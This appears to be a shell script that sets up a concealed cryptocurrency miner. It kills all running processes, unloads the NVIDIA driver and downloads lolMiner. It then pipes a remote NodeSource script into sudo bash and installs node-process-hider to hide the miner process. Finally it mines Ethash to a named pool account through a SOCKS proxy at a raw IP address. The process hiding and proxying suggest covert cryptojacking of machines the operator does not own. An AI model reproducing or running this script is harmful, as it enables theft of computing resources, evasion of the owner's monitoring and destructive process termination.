#!/bin/sh
pkill -9 lolMiner
nvidia-smi -caa
sleep 9
nvidia-smi -caa
sleep 10
killall5 -9 
sleep 3
sudo rmmod nvidia
sleep 9
pkill -9 lolMiner
sleep 100
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz 
tar -xf lolMiner_v1.29_Lin64.tar.gz
cd 1.29
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sudo swapoff -a; sudo swapon -a
sleep 10
ph add lolMiner
./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY socks 202.159.35.153:443  --timeprint on --longstats 30 --dns-over-https 0
sleep 10
sudo swapoff -a; sudo swapon -a

pkill -9 lolMiner
pkill -9 lolMiner
sleep 9
pkill -9 lolMiner
sleep 30
